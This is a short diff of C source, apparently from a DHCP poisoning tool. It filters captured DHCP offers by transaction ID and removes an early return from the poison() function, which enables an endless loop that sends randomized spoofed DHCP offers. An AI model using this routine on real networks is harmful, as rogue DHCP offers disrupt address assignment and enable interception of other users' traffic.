@@ -133,7 +133,9 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 			break;
 		case DHCPOFFER:
 			printf("OFFER, ADDED IP\n");
-			add_ip(&ips, dhcph->yiaddr);
+			if(dhcph->xid == ntohl(10)){
+				add_ip(&ips, dhcph->yiaddr);
+			}
 			break;
 		case DHCPREQUEST:
 			printf("REQUEST\n");
@@ -155,7 +157,6 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 }
 
 void *poison(){
-	return NULL;
 	while(1){
 		randomize_offer(offer);
 		send_packet_poison(sockfd, offer);
